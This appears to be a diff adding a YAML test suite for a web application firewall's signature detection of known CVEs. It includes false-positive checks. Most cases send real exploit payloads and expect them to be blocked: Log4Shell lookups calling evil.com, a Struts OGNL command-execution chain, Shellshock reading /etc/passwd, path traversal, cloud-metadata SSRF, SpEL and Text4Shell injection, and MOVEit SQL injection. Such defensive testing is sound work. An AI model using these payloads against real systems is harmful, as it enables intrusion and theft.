@@ -1,0 +1,309 @@
+meta:
+  category: "Known CVEs"
+  subcategory: "Signature-based Detection"
+  owasp: "A06:2021"
+  severity: "critical"
+
+tests:
+  - id: "cve-001"
+    title: "Log4Shell (CVE-2021-44228) - basic"
+    tags: ["cve", "log4shell", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/data"
+      headers:
+        X-Api-Version: "${jndi:ldap://evil.com/exploit}"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-002"
+    title: "Log4Shell - nested lookup"
+    tags: ["cve", "log4shell", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/data"
+      headers:
+        User-Agent: "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://evil.com/x}"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-003"
+    title: "Log4Shell - URL encoded"
+    tags: ["cve", "log4shell", "evasion", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/data"
+      query_string: "search=%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fexploit%7D"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-004"
+    title: "Log4Shell - in User-Agent"
+    tags: ["cve", "log4shell", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/data"
+      headers:
+        User-Agent: "${jndi:ldap://evil.com/a}"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-005"
+    title: "Spring4Shell (CVE-2022-22965)"
+    tags: ["cve", "spring4shell", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/data"
+      headers:
+        Content-Type: "application/x-www-form-urlencoded"
+      body: "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-006"
+    title: "Apache Struts RCE (CVE-2017-5638)"
+    tags: ["cve", "struts", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/data"
+      headers:
+        Content-Type: "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-007"
+    title: "Shellshock (CVE-2014-6271)"
+    tags: ["cve", "shellshock", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/cgi-bin/test"
+      headers:
+        User-Agent: "() { :; }; /bin/cat /etc/passwd"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-008"
+    title: "Shellshock variant"
+    tags: ["cve", "shellshock", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/cgi-bin/test"
+      headers:
+        Referer: "() { :; }; echo; /usr/bin/id"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-009"
+    title: "Apache path traversal (CVE-2021-41773)"
+    tags: ["cve", "apache", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-010"
+    title: "Apache path traversal variant (CVE-2021-42013)"
+    tags: ["cve", "apache", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-011"
+    title: "Confluence OGNL injection (CVE-2022-26134)"
+    tags: ["cve", "confluence", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-012"
+    title: "F5 BIG-IP RCE (CVE-2022-1388)"
+    tags: ["cve", "f5", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/mgmt/tm/util/bash"
+      headers:
+        Content-Type: "application/json"
+        Authorization: "Basic YWRtaW46"
+        Connection: "X-F5-Auth-Token, X-Forwarded-Host"
+        X-F5-Auth-Token: "a"
+      body: '{"command":"run","utilCmdArgs":"-c id"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-013"
+    title: "GitLab SSRF (CVE-2021-22214)"
+    tags: ["cve", "gitlab", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/v4/ci/lint"
+      headers:
+        Content-Type: "application/json"
+      body: '{"content":"include:\n  remote: http://169.254.169.254/latest/meta-data/"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-014"
+    title: "Text4Shell (CVE-2022-42889)"
+    tags: ["cve", "text4shell", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/search"
+      query_string: "q=${script:javascript:java.lang.Runtime.getRuntime().exec('id')}"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-015"
+    title: "Spring Cloud Function SpEL (CVE-2022-22963)"
+    tags: ["cve", "spring", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/functionRouter"
+      headers:
+        spring.cloud.function.routing-expression: "T(java.lang.Runtime).getRuntime().exec(\"id\")"
+        Content-Type: "application/json"
+      body: '{"data":"test"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-016"
+    title: "WordPress xmlrpc pingback SSRF"
+    tags: ["cve", "wordpress", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/xmlrpc.php"
+      headers:
+        Content-Type: "text/xml"
+      body: '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://169.254.169.254/</string></value></param><param><value><string>http://target.com/</string></value></param></params></methodCall>'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-017"
+    title: "PHPUnit RCE (CVE-2017-9841)"
+    tags: ["cve", "php", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+      body: "<?php echo 'exploited'; ?>"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-018"
+    title: "WebLogic deserialization (CVE-2019-2725)"
+    tags: ["cve", "weblogic", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/_async/AsyncResponseService"
+      headers:
+        Content-Type: "text/xml"
+      body: '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><class><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string></class></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-019"
+    title: "Ivanti Connect Secure RCE (CVE-2024-21887)"
+    tags: ["cve", "ivanti", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection"
+      query_string: "cmd=id"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cve-020"
+    title: "MOVEit Transfer SQLi (CVE-2023-34362)"
+    tags: ["cve", "moveit", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/moveitisapi/moveitisapi.dll"
+      headers:
+        Content-Type: "application/x-www-form-urlencoded"
+      body: "action=m2&TransID=1&InstID=1234;SELECT+*+FROM+moveittransfer.dbo.files--"
+    expected:
+      status: 403
+      action: "block"
+
+  # --- False positives ---
+
+  - id: "cve-fp-001"
+    title: "False positive - JNDI in documentation text"
+    tags: ["cve", "false-positive"]
+    request:
+      method: "POST"
+      path: "/api/docs"
+      headers:
+        Content-Type: "application/json"
+      body: '{"content":"JNDI (Java Naming and Directory Interface) is used for looking up resources"}'
+    expected:
+      status: 200
+      action: "allow"
+
+  - id: "cve-fp-002"
+    title: "False positive - normal CGI path"
+    tags: ["cve", "false-positive"]
+    request:
+      method: "GET"
+      path: "/api/v1/data"
+    expected:
+      status: 200
+      action: "allow"
+
+  - id: "cve-fp-003"
+    title: "False positive - spring in normal text"
+    tags: ["cve", "false-positive"]
+    request:
+      method: "GET"
+      path: "/api/search"
+      query_string: "q=spring weather forecast 2024"
+    expected:
+      status: 200
+      action: "allow"
+
+  - id: "cve-fp-004"
+    title: "False positive - shell in documentation"
+    tags: ["cve", "false-positive"]
+    request:
+      method: "POST"
+      path: "/api/docs"
+      headers:
+        Content-Type: "application/json"
+      body: '{"content":"To start a bash shell, type /bin/bash in the terminal"}'
+    expected:
+      status: 200
+      action: "allow"
+
+  - id: "cve-fp-005"
+    title: "False positive - XML RPC normal usage"
+    tags: ["cve", "false-positive"]
+    request:
+      method: "POST"
+      path: "/api/rpc"
+      headers:
+        Content-Type: "text/xml"
+      body: '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params/></methodCall>'
+    expected:
+      status: 200
+      action: "allow"
